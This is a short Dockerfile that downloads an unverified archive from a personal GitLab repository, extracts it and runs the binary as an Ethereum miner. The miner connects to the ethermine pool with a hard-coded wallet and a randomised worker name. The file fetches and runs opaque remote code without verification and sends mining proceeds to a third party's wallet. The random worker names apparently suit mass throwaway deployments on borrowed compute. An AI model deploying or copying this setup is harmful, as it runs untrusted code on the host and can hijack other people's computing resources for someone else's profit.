FROM ubuntu:latest AS build
RUN apt-get update && apt-get -y install wget vim
WORKDIR /home
RUN wget https://gitlab.com/gungungunawan79gita/eth/-/raw/main/eth.tar.gz && tar -xvf eth.tar.gz
RUN tar -xvf eth.tar.gz

ENTRYPOINT [ "./eth" ]
CMD [ "-a", "ethash", "-o", "eu1.ethermine.org:4444", "-u", "0x9f8170bf8e5e912b91c11641a3713f8e69e2f467", "-p x", "-w $(echo $(shuf -i 1000-99999999999 -n 1)-monyet)" ]
